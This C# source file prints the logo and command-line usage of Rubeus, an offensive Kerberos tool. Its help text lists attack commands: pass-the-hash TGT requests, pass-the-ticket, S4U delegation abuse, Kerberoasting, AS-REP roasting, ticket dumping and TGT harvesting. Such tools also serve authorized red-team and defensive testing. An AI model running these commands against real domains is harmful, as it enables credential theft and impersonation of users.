using System;

namespace Rubeus.Domain
{
    public static class Info
    {
        public static void ShowLogo()
        {
            Console.WriteLine("\r\n   ______        _                      ");
            Console.WriteLine("  (_____ \\      | |                     ");
            Console.WriteLine("   _____) )_   _| |__  _____ _   _  ___ ");
            Console.WriteLine("  |  __  /| | | |  _ \\| ___ | | | |/___)");
            Console.WriteLine("  | |  \\ \\| |_| | |_) ) ____| |_| |___ |");
            Console.WriteLine("  |_|   |_|____/|____/|_____)____/(___/\r\n");
            Console.WriteLine("  v1.2.1\r\n");
        }

        public static void ShowUsage()
        {
            Console.WriteLine("\r\n  Rubeus usage:");

            Console.WriteLine("\r\n    Retrieve a TGT based on a user hash, optionally applying to the current logon session or a specific LUID:");
            Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]");

            Console.WriteLine("\r\n    Retrieve a TGT based on a user hash, start a /netonly process, and to apply the ticket to the new process/logon session:");
            Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]");

            Console.WriteLine("\r\n    Retrieve a service ticket for one or more SPNs, optionally applying the ticket:");
            Console.WriteLine("        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]");

            Console.WriteLine("\r\n    Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:");
            Console.WriteLine("        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]");

            Console.WriteLine("\r\n    Reset a user's password from a supplied TGT (AoratoPw):");
            Console.WriteLine("        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]");

            Console.WriteLine("\r\n    Perform S4U constrained delegation abuse:");
            Console.WriteLine("        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");
            Console.WriteLine("        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");

            Console.WriteLine("\r\n    Submit a TGT, optionally targeting a specific LUID (if elevated):");
            Console.WriteLine("        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]");

            Console.WriteLine("\r\n    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):");
            Console.WriteLine("        Rubeus.exe purge [/luid:LOGINID]");

            Console.WriteLine("\r\n    Parse and describe a ticket (service ticket or TGT):");
            Console.WriteLine("        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>");

            Console.WriteLine("\r\n    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:");
            Console.WriteLine("        Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" [/show]");

            Console.WriteLine("\r\n    Perform Kerberoasting:");
            Console.WriteLine("        Rubeus.exe kerberoast [/spn:\"blah/blah\"] [/user:USER] [/ou:\"OU,...\"]");

            Console.WriteLine("\r\n    Perform Kerberoasting with alternate credentials:");
            Console.WriteLine("        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD [/spn:\"blah/blah\"] [/user:USER] [/ou:\"OU,...\"]");

            Console.WriteLine("\r\n    Perform AS-REP \"roasting\" for users without preauth:");
            Console.WriteLine("        Rubeus.exe asreproast /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]");

            Console.WriteLine("\r\n    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:");
            Console.WriteLine("        Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]");

            Console.WriteLine("\r\n    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:");
            Console.WriteLine("        Rubeus.exe tgtdeleg [/target:SPN]");

            Console.WriteLine("\r\n    Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:");
            Console.WriteLine("        Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER]");

            Console.WriteLine("\r\n    Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:");
            Console.WriteLine("        Rubeus.exe harvest [/interval:MINUTES]");

            Console.WriteLine("\r\n\r\n  NOTE: Base64 ticket blobs can be decoded with :");
            Console.WriteLine("\r\n      [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"aa...\"))\r\n");
        }
    }
}
